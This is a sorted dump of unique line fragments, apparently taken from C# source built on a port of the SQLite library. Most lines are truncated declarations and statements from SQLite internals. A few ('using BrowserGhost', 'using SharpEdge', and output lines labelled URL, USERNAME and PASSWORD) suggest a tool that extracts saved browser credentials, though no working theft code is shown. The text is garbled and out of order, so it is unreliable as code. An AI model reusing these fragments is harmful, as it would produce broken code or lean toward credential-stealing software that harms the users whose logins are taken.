static struct sqlite3_io_methods JournalFileMethods = {
static struct tm y
static u32 pager_set_pagehash(PgHdr pPage){
static void 
static void //sqlite3_free_table(
static void DeleteCriticalSection(Mutex mtx)
static void EnterCriticalSection(Mutex mtx)
static void ExprSetIrreducible( Expr X ) { }
static void InitializeCriticalSection(Mutex mtx)
static void LeaveCriticalSection(Mutex mtx)
static void TRACE_IDX_INPUTS( sqlite3_index_info p )
static void TRACE_IDX_OUTPUTS( sqlite3_index_info p )
static void addArgumentToVtab(Parse 
static void addModuleArgument(sqlite3 
static void addToBlockedList(sqlite3 
static void assertCellInfo(BtCursor pCur) { }
static void bestVirtualIndex(
static void callFinaliser(sqlite3 
static void checkActiveVdbeCnt( sqlite3 db ){}
static void checkListProperties(sqlite3 
static void checkPage(PgHdr pPg){
static void clearAllSharedCacheTableLocks(Btree p){
static void codeTableLocks( Parse pParse )
static void debugMutexEnter(sqlite3_mutex 
static void debugMutexFree(sqlite3_mutex 
static void debugMutexLeave(sqlite3_mutex 
static void downgradeAllSharedCacheTableLocks(Btree p){
static void enterMutex(){
static void expensive_assert( bool x ) { Debug.Assert( x )
static void invalidateAllOverflowCache(BtShared pBt){
static void invalidateIncrblobCursors(
static void invalidateOverflowCache(BtCursor pCur){
static void leaveMutex(){
static void lockBtreeMutex(Btree 
static void noopMutexEnter(sqlite3_mutex 
static void noopMutexFree(sqlite3_mutex 
static void noopMutexLeave(sqlite3_mutex 
static void pagerReportSize(Pager 
static void pager_pagehash(PgHdr pPage){
static void removeFromBlockedList(sqlite3 
static void soundexFunc(
static void sqlite3BtreeEnter( Btree p )
static void sqlite3BtreeEnterAll( sqlite3 db )
static void sqlite3MemFree(object pPrior){ return
static void sqlite3MemMalloc(int nByte){ return 0
static void sqlite3MemShutdown(object NotUsed){ return
static void sqlite3PagerSetCodec(
static void sqlite3TableLock(
static void sqlite3VdbeIOTraceSql( Vdbe p )
static void sqlite3VdbeMutexArrayEnter(Vdbe p){
static void sqlite3_mutex_enter( sqlite3_mutex p )
static void sqlite3_mutex_free( ref sqlite3_mutex p )
static void sqlite3_mutex_leave( sqlite3_mutex p )
static void sqliteAuthBadReturnCode(Parse 
static void unlockBtreeMutex(Btree 
static void updateVirtualTable(
static void winMutexEnter(sqlite3_mutex p){
static void winMutexFree(sqlite3_mutex p){
static void winMutexLeave(sqlite3_mutex p){
static void winceDestroyLock(sqlite3_file pFile){
static void winceMutexAcquire(HANDLE h){
static void yyGrowStack(yyParser p){
step)(sqlite3_stmt
string z
string z = pOp.p4.z
string zArg2 = 0
string zDb = db.aDb[iDb].zName
string zDb = db.aDb[iTabDb].zName
string zDb = pDb.zName
string zDbTrig = isTemp 
string zExternal
string zFullPathname = sqlite3Malloc(nFullPathname)
string zFunc8
string zName      /
string zSql8
string zTab = SCHEMA_TABLE(iDb)
string[] argv = (string[])Oargv
string[] azNew
string[]colv = (string[])Ocolv
struct JournalFile {
struct SrcList_item 
struct sqlite3PrngType 
struct sqlite3_index_constraint 
struct sqlite3_index_constraint_usage 
struct sqlite3_index_orderby 
struct sqlite3_mutex {
struct tm 
struct tm sLocal
swapMixedEndianFloat( v )
swapMixedEndianFloat(t2)
swapMixedEndianFloat(x)
switch ( op )
switch( iType ){
switch( id ){
switch( t ){
system
szCell[nMaxCells]
szPage = pPager.pageSize
szPageDflt = ii
t = 86400 
t = 86400.0
t = i
t' )
t64 = 
t64 = (t64 
t[PASSWORD] -> {2}
t[URL] -> {0}
t[USERNAME] -> {1}
t[{0}] 
table_column_metadata)(sqlite3
temp1)
testcase( db.mallocFailed != 0 
testcase( idxNew == 0 )
testcase( pTerm.eOperator==WO_IN )
testcase( pTerm.eOperator==WO_ISNULL )
the <column-list> is stored here 
this.pageHash=0
thread_cleanup)(void)
time)
time_t t
tmp6B9F.tmp
tmp6D94.tmp
tmp6E32.tmp
token = tkOTHER
tokenType before returning.
too_big:
total_changes)(sqlite3
trace)(sqlite3
transfer_bindings)(sqlite3_stmt
translate_out:
trigger_cleanup:
triggerfinish_cleanup:
truncate
typedef struct JournalFile JournalFile
typedef struct winceLock {
t{0} 
u0000 terminated
u0000 terminated.
u0000' character or
u2.YYERRSYMDT = 0
u32 hash = 0
u32 nByte
u64 elapsed = sqlite3Hwtime() - start
u64 start
u64 v64 = 0
u8 e
u8 isWriteLock = (u8)pOp.p3
u8 lockType = READ_LOCK 
u8 prevcode = iCode[zIn[i]
uTm.dwHighDateTime= t64 >> 32
uTm.dwLowDateTime = t64 
undef MEM_Zero
undef _SQLITE_OS_C_
undef isView
unicodeToMbcs(const WCHAR 
unicodeToUtf8(const WCHAR 
unlockBtreeMutex(p)
unlockBtreeMutex(pLater)
unsigned char 
unsigned char const 
unsigned char zBuf[20]
unsigned int c
unsigned long junk
unsigned long long retval
unsigned long val
update_cleanup:
update_hook)(sqlite3
user_data)(sqlite3_context
using BITVEC_TELEM = System.Byte
using Bitmask = System.UInt64
using BrowserGhost
using CS_SQLite3
using DWORD = System.UInt64
using FILE = System.IO.TextWriter
using HANDLE = System.IntPtr
using Microsoft.Win32
using Pgno = System.UInt32
using SharpEdge
using System
using System.Collections
using System.Collections.Generic
using System.Collections.Specialized
using System.ComponentModel
using System.Data
using System.Diagnostics
using System.IO
using System.Management
using System.Reflection
using System.Reflection.Emit
using System.Runtime.CompilerServices
using System.Runtime.InteropServices
using System.Security.Cryptography
using System.Security.Principal
using System.Text
using System.Text.RegularExpressions
using System.Threading
using WORD = System.Int32
using YYACTIONTYPE = System.Int32
using YYCODETYPE = System.Int32
using i16 = System.Int16
using i32 = System.Int32
using i64 = System.Int64
using sqlite3_int64 = System.Int64
using sqlite_int64 = System.Int64
using time_t = System.Int64
using u16 = System.UInt16
using u32 = System.UInt32
using u64 = System.UInt64
using u8 = System.Byte
using unsigned = System.Int32
using unsigned = System.UInt64
using unsigned = System.UIntPtr
utf8ToMbcs(string zFilename){
utf8ToUnicode(string zFilename){
v = (u32)v64
v = 0
v = a 
v to 0xffffffff.
val < 10.0
val = 1.4159    function return = '3'
val = 3.14159
value )
value_blob)(sqlite3_value
value_bytes)(sqlite3_value
value_bytes16)(sqlite3_value
value_double)(sqlite3_value
value_int)(sqlite3_value
value_int64)(sqlite3_value
value_numeric_type)(sqlite3_value
value_text)(sqlite3_value
value_text16)(sqlite3_value
value_text16be)(sqlite3_value
value_text16le)(sqlite3_value
value_type)(sqlite3_value
vdbe_error_halt:
vdbe_return:
vfs_find)(const char
vfs_register)(sqlite3_vfs
vfs_unregister)(sqlite3_vfs
vmprintf)(const char
void 
void (
void sqlite3AuthContextPop(AuthContext
void sqlite3AuthContextPop(AuthContext 
void sqlite3AuthContextPush(
void sqlite3AuthContextPush(Parse
void sqlite3AuthRead(
void sqlite3AuthRead(Parse
void sqlite3BtreeCacheOverflow(BtCursor pCur){
void sqlite3BtreeEnter(Btree 
void sqlite3BtreeEnterAll(sqlite3 
void sqlite3BtreeEnterCursor(BtCursor 
void sqlite3BtreeLeave(Btree 
void sqlite3BtreeLeaveAll(sqlite3 
void sqlite3BtreeLeaveCursor(BtCursor 
void sqlite3BtreeMutexArrayEnter(BtreeMutexArray 
void sqlite3BtreeMutexArrayInsert(BtreeMutexArray 
void sqlite3BtreeMutexArrayLeave(BtreeMutexArray 
void sqlite3ConnectionBlocked(sqlite3 
void sqlite3ConnectionClosed(sqlite3 
void sqlite3ConnectionUnlocked(sqlite3 
void sqlite3Coverage(int x){
void sqlite3Coverage(int)
void sqlite3MemSetDefault(){
void sqlite3UtfSelfTest(void){
void sqlite3VtabArgExtend(Parse 
void sqlite3VtabArgInit(Parse 
void sqlite3VtabBeginParse(
void sqlite3VtabClear(Table 
void sqlite3VtabFinishParse(Parse 
void sqlite3VtabLock(VTable 
void sqlite3VtabMakeWritable(Parse 
void sqlite3VtabUnlock(VTable 
void sqlite3VtabUnlockList(sqlite3 
void sqlite3_result_text16(
void sqlite3_result_text16be(
void sqlite3_result_text16le(
void_function)(void)
vtab = (char 
vtabDisconnectAll(sqlite3 
whereBeginError:
while(
while( !winMutex_isInit ){
while( (nReq<0 
while( ALWAYS(pList) 
while( j<4 ){
while( n<nChar ){
while( p ){
while( p->locked 
while( p->pPrev ) p = p->pPrev
while( pSib.pNext 
while( pSib.pPrev ){ pSib = pSib.pPrev
while( ppIter ){
winMutexAlloc(int iType){
winMutexNotheld
winMutex_isInit = 0
winMutex_isInit = 1
winMutex_staticMutexes[iType-2]
winMutex_staticMutexes[i].mutex)
winceDestroyLock(pFile)
winceLock 
winceLock local
winceMutexAcquire(pFile.hMutex)
winceMutexRelease(pFile.hMutex)
windows
wsdAutoext.aExt = null
wsdAutoext.nExt = 0
x = 
x)(sqlite3_vtab 
x00/home/bill/b.db-journal
x0020
x0040
xAccess)(sqlite3_vfs
xAuth = db.xAuth
xAuth)(void
xBegin)(sqlite3_vtab 
xBenignBegin)(void)
xBenignEnd)(void)
xBestIndex)(sqlite3_vtab 
xBusyHandler)(void 
xCachesize)(sqlite3_pcache
xCall)(BtCursor
xCallback)(void
xCallback)(void 
xCheckReservedLock)(sqlite3_file
xClose)(sqlite3_file
xClose)(sqlite3_vtab_cursor
xCodec)(void
xCodecFree)(void
xCodecSizeChng)(void
xCollNeeded16)(void
xColumn)(sqlite3_vtab_cursor
xCommit)(sqlite3_vtab 
xCompare)(void
xConnect)(sqlite3
xConstruct)(sqlite3
xCreate)(sqlite3
xCurrentTime)(sqlite3_vfs
xDel)(void
xDelete)(sqlite3_vfs
xDelete)(void
xDestroy)(sqlite3_pcache
xDestroy)(sqlite3_vtab 
xDestroy)(void
xDestroy)(void 
xDeviceCharacteristics)(sqlite3_file
xDisconnect)(sqlite3_vtab 
xDlClose)(sqlite3_vfs
xDlError)(sqlite3_vfs
xDlOpen)(sqlite3_vfs
xDlSym)(sqlite3_vfs
xEntryPoint)(void))
xEof)(sqlite3_vtab_cursor
xFetch)(sqlite3_pcache
xFileControl)(sqlite3_file
xFileSize)(sqlite3_file
xFilter)(sqlite3_vtab_cursor
xFinal)(sqlite3_context
xFindFunction)(sqlite3_vtab 
xFree)(void
xFullPathname)(sqlite3_vfs
xFunc)(sqlite3_context
xGetLastError)(sqlite3_vfs
xInit)(sqlite3
xInit)(void
xIter)(PgHdr 
xLock)(sqlite3_file
xMalloc)(int)
xMutexAlloc)(int)
xMutexEnd)(void)
xMutexEnter)(sqlite3_mutex 
xMutexFree)(sqlite3_mutex 
xMutexHeld)(sqlite3_mutex 
xMutexInit)(void)
xMutexLeave)(sqlite3_mutex 
xMutexNotheld)(sqlite3_mutex 
xMutexTry)(sqlite3_mutex 
xNext)(sqlite3_vtab_cursor
xNotify(
xNotify)(void 
xOpen)(sqlite3_vfs
xOpen)(sqlite3_vtab 
xPagecount)(sqlite3_pcache
xProfile)(void
xRandomness)(sqlite3_vfs
xRead)(sqlite3_file
xRealloc)(void
xRekey)(sqlite3_pcache
xRename)(sqlite3_vtab 
xRollback)(sqlite3_vtab 
xRoundup)(int)
xRowid)(sqlite3_vtab_cursor
xSectorSize)(sqlite3_file
xShutdown)(void
xSize)(void
xSleep)(sqlite3_vfs
xStep)(sqlite3_context
xStress)(void
xSync)(sqlite3_file
xSync)(sqlite3_vtab 
xTrace)(void
xTruncate)(sqlite3_file
xTruncate)(sqlite3_pcache
xUnlock)(sqlite3_file
xUnlockNotify = p->xUnlockNotify
xUnlockNotify)(void 
xUnpin)(sqlite3_pcache
xUpdate)(sqlite3_vtab 
xWrite)(sqlite3_file
xthreadsafe)(void)
y AS a FROM t1 WHERE z<100 AND a>5
y AS a FROM t1 WHERE z<100) WHERE a>5
y.D = sLocal.tm_mday
y.M = sLocal.tm_mon 
y.Y = sLocal.tm_year 
y.h = sLocal.tm_hour
y.m = sLocal.tm_min
y.s = sLocal.tm_sec
y.tm_hour = pTm.wHour
y.tm_mday = pTm.wDay
y.tm_min = pTm.wMinute
y.tm_mon = pTm.wMonth - 1
y.tm_sec = pTm.wSecond
y.tm_wday = pTm.wDayOfWeek
y.tm_year = pTm.wYear - 1900
yyGrowStack(pParser)
yyGrowStack(yypParser)
yyParser pParser = (yyParser
yy_parse_failed(yypParser)
yy_pop_parser_stack(yypParser)
yyerrorhit = 1
yygotominor.yy65))
yymajor = YYNOCODE
yymsp._yyidx -= yysize - 1
yymsp[0].major = (YYCODETYPE)yygoto
yymsp[0].minor = yygotominor
yymsp[0].minor.yy429.mask) 
yymsp[0].stateno = (YYACTIONTYPE)yyact
yymx != YYERRORSYMBOL 
yymx = yypParser.yystack[yypParser.yyidx].major
yypParser.yyerrcnt = 3
yypParser.yyidx
yypParser.yyidx >= 0 
yypParser.yyidxMax = yypParser.yyidx
yystack
z = (const char
z = (void 
z = 0
z = null
z = sqlite3UpperToLower[
z = sqlite3_value_text16(db->pErr)
z = zBuf
z = zIn
z!=0 
z) ){
z2 ){ z2
z2 = z
z= argv[i]
zAlloc[nNewSize]
zArg){
zArg3
zAuthArg = pAuthArg->u.zToken
zBuf
zBuf)
zBuf){
zBufOut){
zBuf[0] = sBuf[0]
zBuf[1] = sBuf[1]
zBuf[2] = sBuf[2]
zBuf[3] = sBuf[3]
zBuf[k] )
zCol
zCol = pTab->aCol[pExpr->iColumn].zName
zCol = pTab->aCol[pTab->iPKey].zName
zCollSeq = 0
zCollSeq = pCol.zColl
zColumnName)
zContext
zConverted = convertUtf8Filename(zFilename)
zCopy = (char 
zCreateTable){
zCsr
zCsr = '
zCsr[nByte]
zDBase
zDBase = db->aDb[iDb].zName
zDataType = 0
zDataType = pCol.zType
zData[offset]
zDb = db.aDb[iDb].zName
zDeleteOnClose
zDestData[iOff % nDestPgsz]
zEnd)) ){
zEnd=='
zErr = 0
zErr)
zErr) 
zErrMsg
zErrMsg)
zFilename
zFilename)
zFilename8
zFilename==0) ){
zFilenameMbcs
zFilenameUtf8
zFormat = (char 
zFullPathname = null
zFullPathname=null
zHeader[sizeof(aJournalMagic)
zIn 
zIn = 
zIn = (u8
zIn)
zIn){
zIn[pMem->n
zIn[pMem->n]
zIn]
zJournal
zKey
zKey = (char 
zKey[i/2] = (h2 
zLowerName
zMasterJournal[nMasterJournal
zMbcsFilename
zMod
zModule = pTab->azModuleArg[0]
zMulti
zName
zName = pTab->zName
zName = utf8ToUnicode(zFilename)
zName)
zName8
zNew
zNew)
zNum == '0')
zNum=='
zNum=='-' ){
zOld
zOut
zOut = 0
zOut = zIn
zOut)
zRelative     /
zResult[0] = sqlite3Toupper(zIn[i])
zResult[j
zResult[j] = 0
zRight[4])
zRight[6])
zSQL)
zSourceName                /
zSql
zSql){
zSql8
zSql[i]
zSql[nBytes]
zSql[pParse->zTail-zSqlCopy]
zSrcData[iOff%nSrcPgsz]
zStart
zStart = zIn
zStmt
zSymbol))(void)
zTab){
zTerm
zTmpWide
zTok
zTok = '_'
zTok = CharLowerW(zName)
zTok == '
zType = columnType(
zType = pTab->aCol[iCol].zType
zUtf8
zVfs        /
zVfsName)
zWhere
zWideFilename
zWideFilename){
z[0] = 0
z[1])
zulu_time:
{                        /
{F1653F20-D47D-4F29-8C55-3C835542AF5F}.Debug
{F1653F20-D47D-4F29-8C55-3C835542AF5F}.Release
} else
} while (dwErr != WAIT_OBJECT_0 
} winceLock
}else
}else if( !pVtab.zErrMsg ){
}else if( (iAmt
}else if( 0==db->pBlockingConnection ){
}else if( IsVirtual(pTab) ){
}else if( enc==SQLITE_ANY ){
}else if( opcode==OP_VFilter ){
}else if( opcode==OP_VUpdate 
}else if( p.nColumn!=nCol ){
}else if( pBt.nTransaction==2 ){
}else if( pC.pVtabCursor ){
}else if( pTab->iPKey>=0 ){
}else if( rc!=SQLITE_OK 
}else if( rc!=SQLITE_OK ){
}else if( rc==SQLITE_DENY ){
}else if( rc==SQLITE_IGNORE ){
}else if( size<p.iSize ){
}else if( wrflag>1 ){
}else if( yymx!=YYERRORSYMBOL ){
}else{
}public _yy429 yy429
